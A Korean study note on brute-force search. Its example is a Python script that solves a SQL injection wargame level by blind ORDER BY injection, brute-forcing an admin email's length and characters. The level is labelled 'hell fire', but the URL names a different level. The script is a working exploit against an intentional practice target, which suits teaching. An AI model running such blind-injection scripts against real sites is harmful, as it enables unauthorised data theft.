# __BruteForce__

## _-BruteForce_
모든 경우의 수를 탐색하면서 요구조건에 충족되는 결과만을 가져온다.<span style="color:grey"><sup>노가다</sup></span>  
순차 탐색, 깊이 우선 탐색, 너비 우선 탐색 등이 도구로 사용되며, 어떤식으로든  
전체를 탐색하였다면 브루트 포스 알고리즘을 사용한 것이다.

## _-time complexity_
O(경우의 수 * 방법1개를 시도해보는데 걸리는 시간복잡도)이다. 즉, 얼마나 걸리는지는  
케이스에 따라 다르면 경우에 따라 굉장히 복잡한 시간복잡도를 가질 수 있다.

## _EX code_
브루트포스를 이용해 비밀번호 무차별대입을 시도하는 문제가 꽤 있어서 옛날에 풀었던 코드 하나 들고옴.  
문제 : Lord of Sql Injection - hell fire
```python
import requests
from sys import stdout
from bs4 import BeautifulSoup


url = """https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?"""
cookies = {'PHPSESSID': '******'}

ascii_first = 33 #!
ascii_end = 126 #~

def ToFindLength():
    i = 0
    length = 0
    while True:
        print("\rTrying: {}".format(str(i)), sep="", end="", flush=True)
        query = "order=if(length(email)='{}' and id='admin', 1, 4)".format(str(i))
        res = requests.get(url + query, cookies=cookies)
        soup = BeautifulSoup(res.text, "html.parser")
        if soup.find("td").text == 'admin':
            length = i
            stdout.write("\n")
            print("[+] admin email length: {}\n".format(str(i)))
            print("Now find the exact value.\n\n")
            break
        else:
            i += 1
    ToFindExactValue(length)

def ToFindExactValue(Len):
    ExactValue = ""
    for i in range(1, Len + 1):
        for j in range(ascii_first, ascii_end + 1):
            query = """order=if(substr(email, {}, 1)=char({}) and id='admin', 1, 4)""".format(str(i), j)
            res = requests.get(url + query, cookies=cookies)
            soup = BeautifulSoup(res.text, "html.parser")
            if soup.find("td").text == 'admin':
                ExactValue += chr(j)
                print("\rFinding Value: {}".format(ExactValue.lower()), sep="", end="", flush=True)
                break
    print("\n[+] Exact Value : {}". format(ExactValue.lower()))
        
if __name__ == "__main__":
    print("\n")
    ToFindLength()
```